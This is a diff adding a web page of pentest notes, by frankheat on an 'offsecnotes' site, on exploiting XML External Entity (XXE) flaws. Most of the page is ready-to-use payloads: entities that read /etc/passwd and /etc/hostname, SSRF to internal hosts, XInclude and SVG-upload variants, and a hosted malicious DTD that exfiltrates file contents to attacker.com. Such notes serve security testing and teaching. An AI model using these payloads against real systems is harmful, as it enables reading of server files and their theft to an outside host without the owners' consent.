@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Learn to detect and exploit XXE (XML External Entity) vulnerabilities. These pentest notes cover file retrieval, SSRF, blind XXE techniques (OAST, error-based), XInclude, and more attack vectors.">
+  <title>offsecnotes | XXE</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>XXE</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#retrieve-files" id="toc-retrieve-files">Retrieve files</a></li>
+<li><a href="#perform-ssrf-attacks" id="toc-perform-ssrf-attacks">Perform SSRF attacks</a></li>
+<li><a href="#blind-xxe" id="toc-blind-xxe">Blind XXE</a>
+<ul>
+<li><a href="#out-of-band-oast-techniques" id="toc-out-of-band-oast-techniques">Out-of-band (OAST) techniques</a></li>
+<li><a href="#via-error-messages" id="toc-via-error-messages">Via error messages</a></li>
+</ul></li>
+<li><a href="#hidden-attack-surface" id="toc-hidden-attack-surface">Hidden attack surface</a>
+<ul>
+<li><a href="#xinclude-attacks" id="toc-xinclude-attacks">XInclude attacks</a></li>
+<li><a href="#via-file-upload" id="toc-via-file-upload">Via file upload</a></li>
+<li><a href="#via-modified-content-type" id="toc-via-modified-content-type">Via modified content type</a></li>
+</ul></li>
+</ul></div>
+  <hr>
+<details>
+<summary>
+Introduction
+</summary>
+<p><strong>What is XML</strong></p>
+<ul>
+<li>Some applications use the XML format to transmit data between the browser and the server.</li>
+<li>Its popularity has now declined in favor of the JSON format</li>
+</ul>
+<p><strong>XXE Impact</strong></p>
+<ul>
+<li>Retrieve files</li>
+<li>Perform SSRF attacks</li>
+</ul>
+</details>
+<hr />
+<h2 id="retrieve-files">Retrieve files</h2>
+<ol type="1">
+<li>Introduce (or edit) a <code>DOCTYPE</code> element defining an external entity with the file path.</li>
+<li>Edit a data value in the XML returned in the app’s response to use the defined external entity.</li>
+</ol>
+<blockquote>
+<p><strong>Note</strong>: To systematically test for XXE, test each data node in the XML individually using your defined entity to see if it appears in the response.</p>
+</blockquote>
+<hr />
+<p><strong>Original</strong></p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="ot"> encoding=</span><span class="st">&quot;UTF-8&quot;</span><span class="fu">?&gt;</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">stockCheck</span>&gt;&lt;<span class="kw">productId</span>&gt;381&lt;/<span class="kw">productId</span>&gt;&lt;/<span class="kw">stockCheck</span>&gt; </span></code></pre></div>
+<p><strong>Exploitation</strong></p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="ot"> encoding=</span><span class="st">&quot;UTF-8&quot;</span><span class="fu">?&gt;</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[</span> <span class="dt">&lt;!ENTITY</span> <span class="dt">xxe</span> SYSTEM <span class="st">&quot;file:///etc/passwd&quot;</span><span class="dt">&gt;</span> <span class="dt">]&gt;</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">stockCheck</span>&gt;&lt;<span class="kw">productId</span>&gt;<span class="dv">&amp;xxe;</span>&lt;/<span class="kw">productId</span>&gt;&lt;/<span class="kw">stockCheck</span>&gt;</span></code></pre></div>
+<hr />
+<h2 id="perform-ssrf-attacks">Perform SSRF attacks</h2>
+<div class="sourceCode" id="cb3"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="ot"> encoding=</span><span class="st">&quot;UTF-8&quot;</span><span class="fu">?&gt;</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[</span> <span class="dt">&lt;!ENTITY</span> <span class="dt">xxe</span> SYSTEM <span class="st">&quot;http://internal.vulnerable-website.com/&quot;</span><span class="dt">&gt;</span> <span class="dt">]&gt;</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">stockCheck</span>&gt;&lt;<span class="kw">productId</span>&gt;1<span class="dv">&amp;xxe;</span>&lt;/<span class="kw">productId</span>&gt;&lt;<span class="kw">storeId</span>&gt;1&lt;/<span class="kw">storeId</span>&gt;&lt;/<span class="kw">stockCheck</span>&gt;</span></code></pre></div>
+<hr />
+<h2 id="blind-xxe">Blind XXE</h2>
+<h3 id="out-of-band-oast-techniques">Out-of-band (OAST) techniques</h3>
+<p><strong>Detection</strong></p>
+<ul>
+<li>Detecting as SSRF
+<ul>
+<li><div class="sourceCode" id="cb4"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[</span> <span class="dt">&lt;!ENTITY</span> <span class="dt">xxe</span> SYSTEM <span class="st">&quot;http://attacker.com/&quot;</span><span class="dt">&gt;</span> <span class="dt">]&gt;</span></span></code></pre></div></li>
+</ul></li>
+<li>Regular entities are blocked? Bypass via XML parameter entities
+<ul>
+<li><div class="sourceCode" id="cb5"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[</span> <span class="dt">&lt;!ENTITY</span> % xxe SYSTEM <span class="st">&quot;http://attacker.com&quot;</span><span class="dt">&gt;</span> <span class="dv">%xxe;</span> <span class="dt">]&gt;</span></span></code></pre></div></li>
+<li>This XXE payload declares an XML parameter entity called <code>xxe</code> and then uses the entity within the DTD</li>
+</ul></li>
+</ul>
+<p><strong>Exploitation</strong></p>
+<ol type="1">
+<li><p>Start a web server and host on <code>http://attacker.com/example.dtd</code> this malicious dtd.</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span>!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;</span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span>!ENTITY % stack &quot;<span class="er">&lt;</span>!ENTITY <span class="dv">&amp;#x25;</span> exfil SYSTEM &#39;http://attacker.com/?x=%file;&#39;&gt;&quot;&gt;</span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>%stack;</span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>%exfil;</span></code></pre></div></li>
+<li><p>Add this external entity</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[&lt;!ENTITY</span> % xxe SYSTEM <span class="st">&quot;http://attacker.com/example.dtd&quot;</span><span class="dt">&gt;</span> <span class="dv">%xxe;</span><span class="dt">]&gt;</span></span></code></pre></div></li>
+</ol>
+<blockquote>
+<p><strong>Note</strong>: This technique might not work with multiline files.</p>
+</blockquote>
+<h3 id="via-error-messages">Via error messages</h3>
+<p>Trigger an XML parsing error message with the file contents.</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span>!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span>!ENTITY % eval &quot;<span class="er">&lt;</span>!ENTITY <span class="dv">&amp;#x25;</span> error SYSTEM &#39;file:///nonexistent/%file;&#39;&gt;&quot;&gt;</span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>%eval;</span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>%error;</span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>: This works if you notice an error in the response when detecting with OAST (e.g., the reflected URL entered).</p>
+</blockquote>
+<hr />
+<h2 id="hidden-attack-surface">Hidden attack surface</h2>
+<ul>
+<li><strong>First case</strong> - Requests that contain data in XML format</li>
+<li><strong>Second case -</strong> Requests that do not contain any XML
+<ul>
+<li><strong>Detection</strong>: Add entity reference that doesn’t exist to cause an error -&gt; ok it’s XML</li>
+</ul></li>
+</ul>
+<h3 id="xinclude-attacks">XInclude attacks</h3>
+<p>Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document.</p>
+<p><code>XInclude</code> is a part of the XML specification that allows an XML document to be built from sub-documents.</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">foo</span><span class="ot"> xmlns:xi=</span><span class="st">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">xi:include</span><span class="ot"> parse=</span><span class="st">&quot;text&quot;</span><span class="ot"> href=</span><span class="st">&quot;file:///etc/passwd&quot;</span>/&gt;&lt;/<span class="kw">foo</span>&gt;</span></code></pre></div>
+<pre class="http"><code>POST /product/stock HTTP/2
+Host: vulnerable.website.com
+[...]
+
+productId=&lt;foo+xmlns%3axi%3d&quot;http%3a//www.w3.org/2001/XInclude&quot;&gt;
+&lt;xi%3ainclude+parse%3d&quot;text&quot;+href%3d&quot;file%3a///etc/passwd&quot;/&gt;&lt;/foo&gt;&amp;storeId=1</code></pre>
+<h3 id="via-file-upload">Via file upload</h3>
+<p>Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="ot"> standalone=</span><span class="st">&quot;yes&quot;</span><span class="fu">?&gt;</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">test</span> <span class="dt">[</span> <span class="dt">&lt;!ENTITY</span> <span class="dt">xxe</span> SYSTEM <span class="st">&quot;file:///etc/hostname&quot;</span> <span class="dt">&gt;</span> <span class="dt">]&gt;</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">svg</span><span class="ot"> width=</span><span class="st">&quot;128px&quot;</span><span class="ot"> height=</span><span class="st">&quot;128px&quot;</span><span class="ot"> xmlns=</span><span class="st">&quot;http://www.w3.org/2000/svg&quot;</span><span class="ot"> xmlns:xlink=</span><span class="st">&quot;http://www.w3.org/1999/xlink&quot;</span><span class="ot"> version=</span><span class="st">&quot;1.1&quot;</span>&gt;</span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">text</span><span class="ot"> font-size=</span><span class="st">&quot;16&quot;</span><span class="ot"> x=</span><span class="st">&quot;0&quot;</span><span class="ot"> y=</span><span class="st">&quot;16&quot;</span>&gt;<span class="dv">&amp;xxe;</span>&lt;/<span class="kw">text</span>&gt;</span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">svg</span>&gt;</span></code></pre></div>
+<p>This works if it’s used image processing library &amp; support SVG images &amp; allow external entity.</p>
+<h3 id="via-modified-content-type">Via modified content type</h3>
+<p>Some web app will tolerate other content types.</p>
+<p><strong>Expected request</strong></p>
+<pre class="http"><code>POST /action HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar</code></pre>
+<p><strong>Submit following request</strong></p>
+<pre class="http"><code>POST /action HTTP/1.0
+Content-Type: text/xml
+Content-Length: 52
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;/foo&gt;</code></pre>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
